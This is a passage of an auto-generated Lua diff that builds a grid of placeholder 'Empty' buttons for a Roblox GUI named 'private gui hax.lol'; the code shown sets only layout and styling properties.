+G2L["2ec"]["TextWrapped"] = true;
+G2L["2ec"]["BorderSizePixel"] = 3;
+G2L["2ec"]["TextSize"] = 14;
+G2L["2ec"]["TextScaled"] = true;
+G2L["2ec"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2ec"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2ec"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2ec"]["Size"] = UDim2.new(0, 81, 0, 30);
+G2L["2ec"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2ec"]["Text"] = [[Empty]];
+G2L["2ec"]["Name"] = [[Button]];
+G2L["2ec"]["Position"] = UDim2.new(0.43365, 0, 0.26799, 0);
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button
+G2L["2ed"] = Instance.new("TextButton", G2L["2ce"]);
+G2L["2ed"]["TextWrapped"] = true;
+G2L["2ed"]["BorderSizePixel"] = 3;
+G2L["2ed"]["TextSize"] = 14;
+G2L["2ed"]["TextScaled"] = true;
+G2L["2ed"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2ed"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2ed"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2ed"]["Size"] = UDim2.new(0, 81, 0, 30);
+G2L["2ed"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2ed"]["Text"] = [[Empty]];
+G2L["2ed"]["Name"] = [[Button]];
+G2L["2ed"]["Position"] = UDim2.new(0.58232, 0, 0.26799, 0);
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button
+G2L["2ee"] = Instance.new("TextButton", G2L["2ce"]);
+G2L["2ee"]["TextWrapped"] = true;
+G2L["2ee"]["BorderSizePixel"] = 3;
+G2L["2ee"]["TextSize"] = 14;
+G2L["2ee"]["TextScaled"] = true;
+G2L["2ee"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2ee"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2ee"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2ee"]["Size"] = UDim2.new(0, 81, 0, 30);
+G2L["2ee"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2ee"]["Text"] = [[Empty]];
+G2L["2ee"]["Name"] = [[Button]];
+G2L["2ee"]["Position"] = UDim2.new(0.72473, 0, 0.26799, 0);
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button
+G2L["2ef"] = Instance.new("TextButton", G2L["2ce"]);
+G2L["2ef"]["TextWrapped"] = true;
+G2L["2ef"]["BorderSizePixel"] = 3;
+G2L["2ef"]["TextSize"] = 14;
+G2L["2ef"]["TextScaled"] = true;
+G2L["2ef"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2ef"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2ef"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2ef"]["Size"] = UDim2.new(0, 81, 0, 30);
+G2L["2ef"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2ef"]["Text"] = [[Empty]];
+G2L["2ef"]["Name"] = [[Button]];
+G2L["2ef"]["Position"] = UDim2.new(0.86401, 0, 0.26799, 0);
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button
+G2L["2f0"] = Instance.new("TextButton", G2L["2ce"]);
+G2L["2f0"]["TextWrapped"] = true;
+G2L["2f0"]["BorderSizePixel"] = 3;
+G2L["2f0"]["TextSize"] = 14;
+G2L["2f0"]["TextScaled"] = true;
+G2L["2f0"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2f0"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2f0"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2f0"]["Size"] = UDim2.new(0, 81, 0, 30);
+G2L["2f0"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2f0"]["Text"] = [[Empty]];
+G2L["2f0"]["Name"] = [[Button]];
+G2L["2f0"]["Position"] = UDim2.new(0.00799, 0, 0.38421, 0);
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button
+G2L["2f1"] = Instance.new("TextButton", G2L["2ce"]);
+G2L["2f1"]["TextWrapped"] = true;
+G2L["2f1"]["BorderSizePixel"] = 3;
+G2L["2f1"]["TextSize"] = 14;
+G2L["2f1"]["TextScaled"] = true;
+G2L["2f1"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2f1"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2f1"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2f1"]["Size"] = UDim2.new(0, 81, 0, 30);
+G2L["2f1"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2f1"]["Text"] = [[Empty]];
+G2L["2f1"]["Name"] = [[Button]];
+G2L["2f1"]["Position"] = UDim2.new(0.1504, 0, 0.38421, 0);
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button
+G2L["2f2"] = Instance.new("TextButton", G2L["2ce"]);
+G2L["2f2"]["TextWrapped"] = true;
+G2L["2f2"]["BorderSizePixel"] = 3;
+G2L["2f2"]["TextSize"] = 14;
+G2L["2f2"]["TextScaled"] = true;
+G2L["2f2"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2f2"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2f2"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2f2"]["Size"] = UDim2.new(0, 81, 0, 30);
+G2L["2f2"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2f2"]["Text"] = [[Empty]];
+G2L["2f2"]["Name"] = [[Button]];
+G2L["2f2"]["Position"] = UDim2.new(0.29124, 0, 0.38421, 0);
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button
+G2L["2f3"] = Instance.new("TextButton", G2L["2ce"]);
+G2L["2f3"]["TextWrapped"] = true;
+G2L["2f3"]["BorderSizePixel"] = 3;
+G2L["2f3"]["TextSize"] = 14;
+G2L["2f3"]["TextScaled"] = true;
+G2L["2f3"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2f3"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2f3"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2f3"]["Size"] = UDim2.new(0, 81, 0, 30);
+G2L["2f3"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2f3"]["Text"] = [[Empty]];
+G2L["2f3"]["Name"] = [[Button]];
+G2L["2f3"]["Position"] = UDim2.new(0.43365, 0, 0.38421, 0);
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button
+G2L["2f4"] = Instance.new("TextButton", G2L["2ce"]);
+G2L["2f4"]["TextWrapped"] = true;
+G2L["2f4"]["BorderSizePixel"] = 3;
+G2L["2f4"]["TextSize"] = 14;
+G2L["2f4"]["TextScaled"] = true;
+G2L["2f4"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2f4"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2f4"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2f4"]["Size"] = UDim2.new(0, 81, 0, 30);
+G2L["2f4"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2f4"]["Text"] = [[Empty]];
+G2L["2f4"]["Name"] = [[Button]];
+G2L["2f4"]["Position"] = UDim2.new(0.58232, 0, 0.38421, 0);
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button
+G2L["2f5"] = Instance.new("TextButton", G2L["2ce"]);
+G2L["2f5"]["TextWrapped"] = true;
+G2L["2f5"]["BorderSizePixel"] = 3;
+G2L["2f5"]["TextSize"] = 14;
+G2L["2f5"]["TextScaled"] = true;
+G2L["2f5"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2f5"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2f5"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2f5"]["Size"] = UDim2.new(0, 81, 0, 30);
+G2L["2f5"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2f5"]["Text"] = [[Empty]];
+G2L["2f5"]["Name"] = [[Button]];
+G2L["2f5"]["Position"] = UDim2.new(0.72473, 0, 0.38421, 0);
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button
+G2L["2f6"] = Instance.new("TextButton", G2L["2ce"]);
+G2L["2f6"]["TextWrapped"] = true;
+G2L["2f6"]["BorderSizePixel"] = 3;
+G2L["2f6"]["TextSize"] = 14;
+G2L["2f6"]["TextScaled"] = true;
+G2L["2f6"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2f6"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2f6"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2f6"]["Size"] = UDim2.new(0, 81, 0, 30);
+G2L["2f6"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2f6"]["Text"] = [[Empty]];
+G2L["2f6"]["Name"] = [[Button]];
+G2L["2f6"]["Position"] = UDim2.new(0.86401, 0, 0.38421, 0);
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button
+G2L["2f7"] = Instance.new("TextButton", G2L["2ce"]);
+G2L["2f7"]["TextWrapped"] = true;
+G2L["2f7"]["BorderSizePixel"] = 3;
+G2L["2f7"]["TextSize"] = 14;
+G2L["2f7"]["TextScaled"] = true;
+G2L["2f7"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2f7"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2f7"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2f7"]["Size"] = UDim2.new(0, 81, 0, 30);
+G2L["2f7"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2f7"]["Text"] = [[Empty]];
+G2L["2f7"]["Name"] = [[Button]];
+G2L["2f7"]["Position"] = UDim2.new(0.00799, 0, 0.50528, 0);
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button
+G2L["2f8"] = Instance.new("TextButton", G2L["2ce"]);
+G2L["2f8"]["TextWrapped"] = true;
+G2L["2f8"]["BorderSizePixel"] = 3;
+G2L["2f8"]["TextSize"] = 14;
+G2L["2f8"]["TextScaled"] = true;
+G2L["2f8"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2f8"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2f8"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2f8"]["Size"] = UDim2.new(0, 81, 0, 30);
+G2L["2f8"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2f8"]["Text"] = [[Empty]];
+G2L["2f8"]["Name"] = [[Button]];
+G2L["2f8"]["Position"] = UDim2.new(0.1504, 0, 0.50528, 0);
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button
+G2L["2f9"] = Instance.new("TextButton", G2L["2ce"]);
+G2L["2f9"]["TextWrapped"] = true;
+G2L["2f9"]["BorderSizePixel"] = 3;
+G2L["2f9"]["TextSize"] = 14;
+G2L["2f9"]["TextScaled"] = true;
+G2L["2f9"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2f9"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2f9"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2f9"]["Size"] = UDim2.new(0, 81, 0, 30);
+G2L["2f9"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2f9"]["Text"] = [[Empty]];
+G2L["2f9"]["Name"] = [[Button]];
+G2L["2f9"]["Position"] = UDim2.new(0.29124, 0, 0.50528, 0);
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button
+G2L["2fa"] = Instance.new("TextButton", G2L["2ce"]);
+G2L["2fa"]["TextWrapped"] = true;
+G2L["2fa"]["BorderSizePixel"] = 3;
+G2L["2fa"]["TextSize"] = 14;
+G2L["2fa"]["TextScaled"] = true;
+G2L["2fa"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2fa"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2fa"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2fa"]["Size"] = UDim2.new(0, 81, 0, 30);
+G2L["2fa"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2fa"]["Text"] = [[Empty]];
+G2L["2fa"]["Name"] = [[Button]];
+G2L["2fa"]["Position"] = UDim2.new(0.43365, 0, 0.50528, 0);
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button
+G2L["2fb"] = Instance.new("TextButton", G2L["2ce"]);
+G2L["2fb"]["TextWrapped"] = true;
+G2L["2fb"]["BorderSizePixel"] = 3;
+G2L["2fb"]["TextSize"] = 14;
+G2L["2fb"]["TextScaled"] = true;
+G2L["2fb"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2fb"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2fb"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2fb"]["Size"] = UDim2.new(0, 81, 0, 30);
+G2L["2fb"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2fb"]["Text"] = [[Empty]];
+G2L["2fb"]["Name"] = [[Button]];
+G2L["2fb"]["Position"] = UDim2.new(0.58232, 0, 0.50528, 0);
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button
+G2L["2fc"] = Instance.new("TextButton", G2L["2ce"]);
+G2L["2fc"]["TextWrapped"] = true;
+G2L["2fc"]["BorderSizePixel"] = 3;
+G2L["2fc"]["TextSize"] = 14;
+G2L["2fc"]["TextScaled"] = true;
+G2L["2fc"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2fc"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2fc"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2fc"]["Size"] = UDim2.new(0, 81, 0, 30);
+G2L["2fc"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2fc"]["Text"] = [[Empty]];
+G2L["2fc"]["Name"] = [[Button]];
+G2L["2fc"]["Position"] = UDim2.new(0.72473, 0, 0.50528, 0);
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button
+G2L["2fd"] = Instance.new("TextButton", G2L["2ce"]);
+G2L["2fd"]["TextWrapped"] = true;
+G2L["2fd"]["BorderSizePixel"] = 3;
+G2L["2fd"]["TextSize"] = 14;
+G2L["2fd"]["TextScaled"] = true;
+G2L["2fd"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2fd"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2fd"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2fd"]["Size"] = UDim2.new(0, 81, 0, 30);
+G2L["2fd"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2fd"]["Text"] = [[Empty]];
+G2L["2fd"]["Name"] = [[Button]];
+G2L["2fd"]["Position"] = UDim2.new(0.86401, 0, 0.50528, 0);
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button
+G2L["2fe"] = Instance.new("TextButton", G2L["2ce"]);
+G2L["2fe"]["TextWrapped"] = true;
+G2L["2fe"]["BorderSizePixel"] = 3;
+G2L["2fe"]["TextSize"] = 14;
+G2L["2fe"]["TextScaled"] = true;
+G2L["2fe"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2fe"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2fe"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2fe"]["Size"] = UDim2.new(0, 81, 0, 30);
+G2L["2fe"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2fe"]["Text"] = [[Empty]];
+G2L["2fe"]["Name"] = [[Button]];
+G2L["2fe"]["Position"] = UDim2.new(0.00799, 0, 0.6215, 0);
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button
+G2L["2ff"] = Instance.new("TextButton", G2L["2ce"]);
+G2L["2ff"]["TextWrapped"] = true;
+G2L["2ff"]["BorderSizePixel"] = 3;
+G2L["2ff"]["TextSize"] = 14;
+G2L["2ff"]["TextScaled"] = true;
+G2L["2ff"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2ff"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2ff"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2ff"]["Size"] = UDim2.new(0, 81, 0, 30);
+G2L["2ff"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2ff"]["Text"] = [[Empty]];
+G2L["2ff"]["Name"] = [[Button]];
+G2L["2ff"]["Position"] = UDim2.new(0.1504, 0, 0.6215, 0);
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button
+G2L["300"] = Instance.new("TextButton", G2L["2ce"]);
+G2L["300"]["TextWrapped"] = true;
+G2L["300"]["BorderSizePixel"] = 3;
+G2L["300"]["TextSize"] = 14;
+G2L["300"]["TextScaled"] = true;
+G2L["300"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["300"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["300"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["300"]["Size"] = UDim2.new(0, 81, 0, 30);
+G2L["300"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["300"]["Text"] = [[Empty]];
+G2L["300"]["Name"] = [[Button]];
+G2L["300"]["Position"] = UDim2.new(0.29124, 0, 0.6215, 0);
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button
+G2L["301"] = Instance.new("TextButton", G2L["2ce"]);
+G2L["301"]["TextWrapped"] = true;
+G2L["301"]["BorderSizePixel"] = 3;
+G2L["301"]["TextSize"] = 14;
+G2L["301"]["TextScaled"] = true;
+G2L["301"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["301"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["301"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["301"]["Size"] = UDim2.new(0, 81, 0, 30);
+G2L["301"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["301"]["Text"] = [[Empty]];
+G2L["301"]["Name"] = [[Button]];
+G2L["301"]["Position"] = UDim2.new(0.43522, 0, 0.6215, 0);
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button
+G2L["302"] = Instance.new("TextButton", G2L["2ce"]);
+G2L["302"]["TextWrapped"] = true;
+G2L["302"]["BorderSizePixel"] = 3;
+G2L["302"]["TextSize"] = 14;
+G2L["302"]["TextScaled"] = true;
+G2L["302"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["302"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["302"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["302"]["Size"] = UDim2.new(0, 81, 0, 30);
+G2L["302"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["302"]["Text"] = [[Empty]];
+G2L["302"]["Name"] = [[Button]];
+G2L["302"]["Position"] = UDim2.new(0.58232, 0, 0.6215, 0);
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button
+G2L["303"] = Instance.new("TextButton", G2L["2ce"]);
+G2L["303"]["TextWrapped"] = true;
+G2L["303"]["BorderSizePixel"] = 3;
+G2L["303"]["TextSize"] = 14;
+G2L["303"]["TextScaled"] = true;
+G2L["303"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["303"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["303"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["303"]["Size"] = UDim2.new(0, 81, 0, 30);
+G2L["303"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["303"]["Text"] = [[Empty]];
+G2L["303"]["Name"] = [[Button]];
+G2L["303"]["Position"] = UDim2.new(0.72473, 0, 0.6215, 0);
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button
+G2L["304"] = Instance.new("TextButton", G2L["2ce"]);
+G2L["304"]["TextWrapped"] = true;
+G2L["304"]["BorderSizePixel"] = 3;
+G2L["304"]["TextSize"] = 14;
+G2L["304"]["TextScaled"] = true;
+G2L["304"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["304"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["304"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["304"]["Size"] = UDim2.new(0, 81, 0, 30);
+G2L["304"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["304"]["Text"] = [[Empty]];
+G2L["304"]["Name"] = [[Button]];
+G2L["304"]["Position"] = UDim2.new(0.86401, 0, 0.6215, 0);
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button
+G2L["305"] = Instance.new("TextButton", G2L["2ce"]);
+G2L["305"]["TextWrapped"] = true;
+G2L["305"]["BorderSizePixel"] = 3;
+G2L["305"]["TextSize"] = 14;
+G2L["305"]["TextScaled"] = true;
+G2L["305"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["305"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["305"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["305"]["Size"] = UDim2.new(0, 81, 0, 30);
+G2L["305"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["305"]["Text"] = [[Empty]];
+G2L["305"]["Name"] = [[Button]];
+G2L["305"]["Position"] = UDim2.new(0.00799, 0, 0.74499, 0);
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button
+G2L["306"] = Instance.new("TextButton", G2L["2ce"]);
+G2L["306"]["TextWrapped"] = true;
+G2L["306"]["BorderSizePixel"] = 3;
+G2L["306"]["TextSize"] = 14;
+G2L["306"]["TextScaled"] = true;
+G2L["306"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["306"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["306"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["306"]["Size"] = UDim2.new(0, 81, 0, 30);
+G2L["306"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["306"]["Text"] = [[Empty]];
+G2L["306"]["Name"] = [[Button]];
+G2L["306"]["Position"] = UDim2.new(0.14883, 0, 0.74499, 0);
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button
+G2L["307"] = Instance.new("TextButton", G2L["2ce"]);
+G2L["307"]["TextWrapped"] = true;
+G2L["307"]["BorderSizePixel"] = 3;
+G2L["307"]["TextSize"] = 14;
+G2L["307"]["TextScaled"] = true;
+G2L["307"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["307"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["307"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["307"]["Size"] = UDim2.new(0, 81, 0, 30);
+G2L["307"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["307"]["Text"] = [[Empty]];
+G2L["307"]["Name"] = [[Button]];
+G2L["307"]["Position"] = UDim2.new(0.29124, 0, 0.74499, 0);
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button
+G2L["308"] = Instance.new("TextButton", G2L["2ce"]);
+G2L["308"]["TextWrapped"] = true;
+G2L["308"]["BorderSizePixel"] = 3;
+G2L["308"]["TextSize"] = 14;
+G2L["308"]["TextScaled"] = true;
+G2L["308"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["308"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["308"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["308"]["Size"] = UDim2.new(0, 81, 0, 30);
+G2L["308"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["308"]["Text"] = [[Empty]];
+G2L["308"]["Name"] = [[Button]];
+G2L["308"]["Position"] = UDim2.new(0.43365, 0, 0.74499, 0);
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button
+G2L["309"] = Instance.new("TextButton", G2L["2ce"]);
+G2L["309"]["TextWrapped"] = true;
+G2L["309"]["BorderSizePixel"] = 3;
+G2L["309"]["TextSize"] = 14;
+G2L["309"]["TextScaled"] = true;
+G2L["309"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["309"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["309"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["309"]["Size"] = UDim2.new(0, 81, 0, 30);
+G2L["309"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["309"]["Text"] = [[Empty]];
+G2L["309"]["Name"] = [[Button]];
+G2L["309"]["Position"] = UDim2.new(0.58232, 0, 0.74499, 0);
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button
+G2L["30a"] = Instance.new("TextButton", G2L["2ce"]);
+G2L["30a"]["TextWrapped"] = true;
+G2L["30a"]["BorderSizePixel"] = 3;
+G2L["30a"]["TextSize"] = 14;
+G2L["30a"]["TextScaled"] = true;
+G2L["30a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["30a"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["30a"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["30a"]["Size"] = UDim2.new(0, 81, 0, 30);
+G2L["30a"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["30a"]["Text"] = [[Empty]];
+G2L["30a"]["Name"] = [[Button]];
+G2L["30a"]["Position"] = UDim2.new(0.72473, 0, 0.74499, 0);
+
+
+-- StarterGui.private gui hax.lol.Gui Page.Button
+G2L["30b"] = Instance.new("TextButton", G2L["2ce"]);
+G2L["30b"]["TextWrapped"] = true;
+G2L["30b"]["BorderSizePixel"] = 3;
+G2L["30b"]["TextSize"] = 14;
+G2L["30b"]["TextScaled"] = true;
+G2L["30b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["30b"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["30b"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["30b"]["Size"] = UDim2.new(0, 81, 0, 30);
+G2L["30b"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["30b"]["Text"] = [[Empty]];
+G2L["30b"]["Name"] = [[Button]];
+G2L["30b"]["Position"] = UDim2.new(0.86401, 0, 0.74499, 0);
+
+
+-- StarterGui.private gui hax.lol.Gui tab
+G2L["30c"] = Instance.new("TextButton", G2L["2"]);
+G2L["30c"]["TextWrapped"] = true;
+G2L["30c"]["BorderSizePixel"] = 3;
